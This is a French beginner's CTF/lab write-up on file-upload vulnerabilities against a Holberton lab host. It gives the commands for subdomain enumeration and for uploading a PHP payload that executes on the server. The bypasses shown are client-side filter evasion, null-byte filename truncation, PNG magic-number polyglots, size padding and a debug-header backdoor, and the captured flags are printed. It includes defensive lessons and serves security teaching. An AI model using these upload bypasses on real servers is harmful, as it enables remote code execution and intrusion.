# 0x05 - Upload Vulnerabilities

Ce dossier documente, étape par étape et **pour un débutant total**, la résolution des
tâches sur les vulnérabilités d'upload de fichiers.

Domaine principal de la cible : `http://web0x05.hbtn` (machine interne du lab, accessible
uniquement depuis la VM / le VPN Holberton).

---

## Vocabulaire de base (à lire une fois)

- **Sous-domaine (subdomain)** : un préfixe devant le domaine, ex. `boutique.exemple.com`.
  Ici on cherche un sous-domaine de `web0x05.hbtn`.
- **vhost (virtual host)** : un même serveur peut héberger plusieurs sites. Il choisit le
  site à afficher selon l'en-tête HTTP `Host:` envoyé par le navigateur. On peut donc
  "viser" un sous-domaine en envoyant le bon `Host:` même sans DNS.
- **`/etc/hosts`** : un fichier local qui associe un nom à une adresse IP, sans passer par
  un serveur DNS. Indispensable ici car `.hbtn` n'est pas un vrai domaine public.
- **`curl`** : un outil en ligne de commande qui envoie des requêtes HTTP (comme un
  navigateur, mais sans interface et sans exécuter le JavaScript).

---

## Task 0 — Trouver le sous-domaine qui héberge l'upload

**Objectif :** identifier le sous-domaine de `web0x05.hbtn` qui contient une fonctionnalité
d'upload de fichiers. Réponse à écrire dans `0-target.txt`.

### 1. Rendre la cible accessible

`.hbtn` n'existe pas sur Internet, donc il faut dire à notre machine où se trouve le
serveur. On vérifie d'abord si le nom est déjà connu :

```bash
getent hosts web0x05.hbtn
# -> 10.42.104.23   web0x05.hbtn   (l'IP du serveur du lab)
```

S'il ne résout pas, on l'ajoute à la main (remplacer par la bonne IP) :

```bash
echo "10.42.104.23 web0x05.hbtn" | sudo tee -a /etc/hosts
```

On confirme que le serveur répond :

```bash
curl -sI http://web0x05.hbtn/
# -> HTTP/1.1 200 OK ... (Content-Length: 281 = page "mauvais sous-domaine")
```

### 2. Comprendre le piège

Visiter le domaine principal renvoie une fausse page 404 : *"Invalid Subdomain, try
harder..."*. **Leçon importante :** quand une appli répond un message moqueur comme ça, elle
ne nous aidera pas via son contenu (pas de lien, pas de `robots.txt` utile). Il faut
**énumérer** les sous-domaines.

### 3. Énumérer les sous-domaines

Un outil comme `gobuster` teste une liste de noms possibles en envoyant chacun dans
l'en-tête `Host:`, et garde ceux dont la réponse diffère de la page par défaut (281 octets) :

```bash
gobuster vhost -u http://web0x05.hbtn \
  -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 20 --exclude-length 281
```

Les listes classiques contiennent des noms "purs" (`mail`, `dev`, `api`...) mais **pas** les
noms composés avec tiret comme `test-s3`. Pour trouver ce genre de nom, deux options :

- **Permutations** : générer `préfixe-service` à partir du thème de l'exercice (ici
  "upload" = stockage de fichiers = `s3`, `storage`, `bucket`...). `s3` vient d'Amazon S3,
  le service de stockage de fichiers de référence :
  ```bash
  for p in test dev staging qa; do for s in s3 storage bucket upload files; do echo "$p-$s"; done; done > perms.txt
  gobuster vhost -u http://web0x05.hbtn -w perms.txt --append-domain -t 20 --exclude-length 281
  ```
- **Transfert de zone DNS (AXFR)** : si le serveur DNS est mal configuré, il donne toute la
  liste d'un coup, sans rien deviner :
  ```bash
  dig axfr web0x05.hbtn @10.42.104.23
  ```

### 4. Résultat

Le sous-domaine vulnérable est **`test-s3.web0x05.hbtn`**. On l'écrit dans le livrable :

```bash
echo "test-s3.web0x05.hbtn" > 0-target.txt
```

---

## Task 1 — Contourner le filtrage de type de fichier (côté client)

**Objectif :** uploader un fichier `.php` alors que l'appli n'accepte en apparence que des
images, pour récupérer un `Flag`. Réponse à écrire dans `1-flag.txt`.

### 1. Comprendre la page d'upload

La page `http://test-s3.web0x05.hbtn/task1` est une **SPA** (Single Page Application) : le
HTML est presque vide, tout est construit par un fichier JavaScript. On y repère un indice :

```html
<div id="main" data-url="/api/task1/"></div>
```

→ l'API d'upload est à **`/api/task1/`**.

On vérifie quelles méthodes HTTP elle accepte :

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/api/task1/
# -> 405 (Method Not Allowed) : un GET est refusé, donc elle attend un POST (= l'upload)
```

### 2. Trouver le nom du champ et le filtre

En lisant le JavaScript, on voit qu'il n'autorise que les images (`.png`, `image/png`,
`image/svg`). **C'est une validation côté client** : elle s'exécute dans le navigateur.

Pour connaître le nom du champ attendu par le serveur, on envoie un POST vide et on lit
l'erreur :

```bash
curl -s -X POST -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/api/task1/
# -> {"error":"No file part found."}  => le champ s'appelle "file"
```

### 3. Le principe du bypass (le cœur de la leçon)

> Une validation en **JavaScript ne protège rien** : elle ne tourne que dans le navigateur.
> Si on envoie la requête d'upload nous-mêmes avec `curl` (ou Burp Suite), **le JavaScript
> n'est jamais exécuté**, donc le filtre d'extension est purement et simplement ignoré.

La vraie défense doit toujours être **côté serveur**.

### 4. Fabriquer et envoyer le fichier malveillant

On crée un fichier PHP minimal qui lit le flag (fourni par l'énoncé) :

```bash
echo "<?php readfile('FLAG_1.txt') ?>" > shell.php
```

On l'uploade directement vers l'API, en ajoutant un faux type MIME `image/png` pour faire
bonne figure (optionnel ici, mais bon réflexe) :

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" \
     -F 'file=@shell.php;type=image/png' \
     http://web0x05.hbtn/api/task1/
# -> {"message":"'/static/upload/shell.php' uploaded successfully."}
```

Le serveur a accepté le `.php` ET nous dit où il est rangé : `/static/upload/shell.php`.

### 5. Déclencher l'exécution et lire le flag

Il suffit de visiter le fichier uploadé. Comme le serveur exécute le PHP, notre
`readfile('FLAG_1.txt')` affiche le contenu du flag :

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/static/upload/shell.php
# -> 85928b5919b0808686cbbd3c06cf1c5d
```

### 6. Résultat

```bash
echo "85928b5919b0808686cbbd3c06cf1c5d" > 1-flag.txt
```

**Deux failles cumulées côté serveur :**
1. aucune vérification réelle de l'extension/type du fichier (le filtre n'était que côté client) ;
2. le dossier d'upload `/static/upload/` **exécute** le PHP → on obtient une exécution de code à distance (RCE).

---

## Rappel pour les tasks 2 à 4 : construire la requête à la main

À partir de la Task 2, on contrôle finement le **nom du fichier** et son **contenu**
(octets bruts). `curl -F` ne permet pas d'insérer certains caractères spéciaux (null byte,
etc.), donc on fabrique nous-mêmes le corps de la requête *multipart/form-data* avec
`printf` et on l'envoie avec `--data-binary`. Structure d'un corps multipart :

```
------sep                                        <- délimiteur (boundary)
Content-Disposition: form-data; name="file"; filename="NOM_DU_FICHIER"
Content-Type: image/png

CONTENU_DU_FICHIER
------sep--                                       <- délimiteur de fin
```

Rappel clé des tasks précédentes : le serveur **n'exécute le PHP que si le fichier
enregistré se termine exactement par `.php`** (`/static/upload/xxx.php`). Tout l'enjeu est
donc : *faire accepter le fichier par le filtre, tout en obtenant un nom enregistré en
`.php`.*

---

## Task 2 — Caractères spéciaux dans le nom (bypass serveur)

**Objectif :** la validation est maintenant **côté serveur** (on ne peut plus l'ignorer
avec curl comme en Task 1). Elle n'autorise que certaines extensions (`.png`). Il faut la
tromper avec un caractère spécial dans le nom. Réponse dans `2-flag.txt`.

### 1. Comprendre le filtre

On teste plein de noms. Résultat : seul `shell.php.png` est accepté → **le serveur ne
regarde que la DERNIÈRE extension** (`.png` = autorisée) et ignore le `.php` au milieu.

Mais si on récupère `shell.php.png`, le serveur le renvoie **tel quel (code source)**, sans
l'exécuter, car le nom finit par `.png`. Il faut donc un nom enregistré finissant par `.php`.

### 2. Le null byte (`%00`)

Idée : un **octet null** (`%00`) coupe les chaînes de caractères dans beaucoup de langages.
On envoie le nom `p2.php%00.png` :

- Le **validateur** lit la chaîne entière, voit qu'elle finit par `.png` → **autorisé**.
- Au moment d'**enregistrer**, le serveur décode `%00` en octet null et **tronque** le nom
  à cet endroit → le fichier est sauvegardé sous `p2.php`.

```bash
# corps multipart avec filename="p2.php%00.png" + contenu "<?php readfile('FLAG_2.txt') ?>"
# (voir task2b.sh : on le fabrique avec printf puis curl --data-binary)
curl -s -H "Host: test-s3.web0x05.hbtn" \
  -H "Content-Type: multipart/form-data; boundary=----sep123" \
  --data-binary @corps.bin \
  http://web0x05.hbtn/api/task2/
# -> {"message":"'/static/upload/p2.php' uploaded successfully."}
```

### 3. Récupérer le flag

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/static/upload/p2.php
# -> 3306d3b76d0551df37e0ffd6cb02f22f
```

**À retenir :** ne jamais faire confiance au nom de fichier fourni par l'utilisateur ;
le nettoyer (ex. `secure_filename`) **avant** toute validation, et valider le nom final.

---

## Task 3 — Magic numbers (inspection du contenu)

**Objectif :** le serveur inspecte désormais le **contenu** du fichier via ses *magic
numbers* (les premiers octets qui identifient le format). Un fichier PHP tout nu est rejeté.
Réponse dans `3-flag.txt`.

### 1. C'est quoi un magic number ?

Ce sont les premiers octets d'un fichier qui disent son vrai type, indépendamment de son nom.
Exemples :
- PNG : `89 50 4E 47 0D 0A 1A 0A`  (`\x89PNG\r\n\x1a\n`)
- GIF : `47 49 46 38 39 61`         (`GIF89a`)
- JPEG : `FF D8 FF`

### 2. Fabriquer un fichier hybride

On met les **vrais octets magiques PNG au tout début**, puis notre code PHP juste après. Le
serveur voit « c'est un PNG » (contenu valide) ; l'interpréteur PHP, lui, ignore les octets
avant `<?php` et exécute le code.

On combine avec le **null byte** de la Task 2 pour que le nom enregistré finisse en `.php` :

- nom : `p3b.php%00.png`
- contenu : `\x89PNG\r\n\x1a\n` + `<?php readfile('FLAG_3.txt') ?>`

```bash
# (voir task3.sh) : seul PNG passe, GIF est refusé => la whitelist de magic numbers est stricte
curl -s -H "Host: test-s3.web0x05.hbtn" \
  -H "Content-Type: multipart/form-data; boundary=----sep789" \
  --data-binary @corps.bin \
  http://web0x05.hbtn/api/task3/
# -> {"message":"'/static/upload/p3b.php' uploaded successfully."}
```

### 3. Récupérer le flag

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/static/upload/p3b.php
# -> (octets PNG illisibles) puis : 0fe732c9e85d19232783853b5391341e
```

**À retenir :** vérifier le magic number ne suffit pas — un fichier peut être à la fois une
image valide ET du code exécutable. La vraie défense : stocker les uploads hors d'un dossier
exécutable, et/ou ré-encoder l'image.

---

## Task 4 — La taille du fichier (et une backdoor)

**Objectif :** une limite de taille bloque l'upload. Il faut la contourner. Réponse dans
`4-flag.txt`.

### 1. Découvrir la règle exacte

En envoyant notre petit fichier PNG+PHP, le serveur répond :

```
{"error":"File size not allowed (min: 80KB)"}
```

Surprise : ce n'est pas un **maximum** mais un **minimum de 80 Ko** ! (Logique tordue :
« une vraie image fait forcément plus de 80 Ko »). Notre payload fait quelques octets → rejeté.

### 2. Méthode principale : rembourrer le fichier

On ajoute du **bourrage** (padding) après le code PHP pour dépasser 80 Ko, sans casser
l'exécution (le PHP s'exécute, le reste est juste des données en plus) :

- nom : `p4b.php%00.png` (toujours le null byte pour finir en `.php`)
- contenu : magic PNG + `<?php readfile('FLAG_4.txt') ?>` + ~90 000 octets de bourrage

```bash
# (voir task4.sh) : head -c 90000 /dev/zero | tr '\0' 'A'  ajoute 90 Ko de 'A'
curl -s -H "Host: test-s3.web0x05.hbtn" \
  -H "Content-Type: multipart/form-data; boundary=----sep444" \
  --data-binary @big.bin \
  http://web0x05.hbtn/api/task4/
# -> {"message":"'/static/upload/p4b.php' uploaded successfully."}

curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/static/upload/p4b.php
# -> 93c4fa08514e90c0b80550f28430c062
```

### 3. La backdoor cachée (indice de l'énoncé)

L'énoncé dit : *« regarde les en-têtes de réponse »*. En affichant les en-têtes (`curl -D -`)
on trouve :

```
X-Debug-Mode: False
```

En renvoyant l'en-tête `X-Debug-Mode: True` dans notre requête, le serveur **désactive la
vérification de taille** et accepte un petit fichier. C'est une porte dérobée laissée par le
développeur (à ne JAMAIS faire en vrai).

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" -H "X-Debug-Mode: True" ...
# -> upload accepté malgré la petite taille
```

### 4. Résultat

```bash
echo "93c4fa08514e90c0b80550f28430c062" > 4-flag.txt
```

**À retenir :** une limite de taille ne protège pas contre un payload qu'on peut rembourrer ;
et une « backdoor de debug » dans le code est une faille critique. Les contrôles de sécurité
doivent être robustes et ne jamais pouvoir être désactivés par un simple en-tête client.
